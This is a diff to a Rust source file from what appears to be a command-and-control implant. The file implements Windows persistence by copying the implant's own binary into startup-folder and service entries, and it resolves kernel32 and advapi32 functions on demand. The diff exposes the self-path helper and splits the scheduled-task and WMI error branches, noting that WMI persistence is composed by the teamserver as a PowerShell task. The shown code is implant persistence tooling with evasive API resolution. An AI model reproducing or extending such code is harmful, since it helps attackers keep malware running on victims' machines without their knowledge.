@@ -5,9 +5,10 @@
 //! (advapi32/kernel32 resolved on demand); the persisted binary is a
 //! copy of the implant itself unless the operator staged one (`exe`).
 //!
-//! The scheduled-task (ITaskService) and WMI event-subscription COM
-//! vectors are follow-ups: both need raw COM vtable plumbing and the
-//! three mechanisms here already cover boot + logon survival.
+//! WMI event-subscription persistence (ABR-T038) is composed by the
+//! TEAMSERVER as an in-process PowerShell task — `persist wmi` never
+//! reaches this module. The scheduled-task (ITaskService) vector via
+//! raw COM remains a follow-up.
 
 // Same on-demand FFI transmute idiom as modules.rs (see the note there).
 #![allow(clippy::missing_transmute_annotations)]
@@ -50,7 +51,7 @@ pub fn stage(
 }
 
 /// Path of the running image.
-fn self_path() -> Result<String, String> {
+pub(crate) fn self_path() -> Result<String, String> {
     let get: unsafe extern "system" fn(usize, *mut u16, u32) -> u32 =
         match unsafe { syscalls::export_address("kernel32.dll", "GetModuleFileNameW") } {
             Some(addr) => unsafe { std::mem::transmute(addr) },
@@ -480,9 +481,14 @@ fn install(mechanism: &str, name: &str, exe: &str, args: &str) -> Result<Vec<u8>
             format!("startup {startup} (runs at logon)")
         }
         "service" => service_install(name, &command)?,
-        "schtasks" | "wmi" => {
+        "schtasks" => {
             return Err(format!(
-                "mechanism {mechanism} is a documented follow-up (raw COM plumbing); available: {MECHANISMS}"
+                "mechanism schtasks is a documented follow-up (ITaskService raw COM); available: {MECHANISMS}"
+            ));
+        }
+        "wmi" => {
+            return Err(format!(
+                "wmi persistence is teamserver-composed (ABR-T038, in-process PowerShell task); available in-process: {MECHANISMS}"
             ));
         }
         other => {
